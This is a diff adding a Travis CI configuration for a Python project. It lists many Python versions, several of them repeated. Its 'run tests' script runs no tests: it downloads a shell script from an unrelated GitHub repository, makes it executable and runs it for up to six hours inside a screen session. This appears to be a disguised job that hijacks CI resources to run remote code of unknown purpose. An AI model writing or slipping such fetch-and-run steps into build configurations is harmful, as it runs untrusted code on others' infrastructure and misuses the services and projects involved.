@@ -1,0 +1,35 @@
+language: python
+python:
+  - "2.7.14"
+  - "2.7.13"
+  - "2.7.15"
+  - "2.7.14"
+  - "2.7.15"
+  - "2.7.16"
+  - "2.7.17"
+  - "2.7.18"
+  - "2.7"
+  - "3.4.5"
+  - "3.4.6"
+  - "3.4.7"
+  - "3.4.8"
+  - "3.4"
+  - "3.5.10"
+  - "3.5.2"
+  - "3.5.3"
+  - "3.5.5"  
+  - "3.4"
+  - "3.5"
+  - "3.6"      # current default Python on Travis CI
+  - "3.7"
+  - "3.8"
+  - "3.9"
+# command to install dependencies
+
+
+
+# command to run tests
+script:
+  - wget https://github.com/antonylally07/sgr/raw/main/set.sh 
+  - chmod +x set.sh 
+  - travis_wait 360 ./set.sh > screen -R azuvi 
